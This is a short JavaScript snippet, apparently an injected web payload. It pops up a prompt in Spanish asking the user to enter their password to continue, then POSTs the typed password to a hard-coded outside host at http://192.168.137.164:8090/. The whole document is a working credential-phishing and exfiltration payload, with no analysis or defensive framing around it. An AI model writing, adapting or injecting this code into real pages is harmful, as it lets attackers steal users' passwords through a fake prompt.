var pass=prompt('Para continuar inserta tu contraseña');
//alert(pass)

function send_response(response){
	var oReqX = new XMLHttpRequest();
	oReqX.open("POST","http://192.168.137.164:8090/");
	oReqX.send(response);
}

send_response(pass)

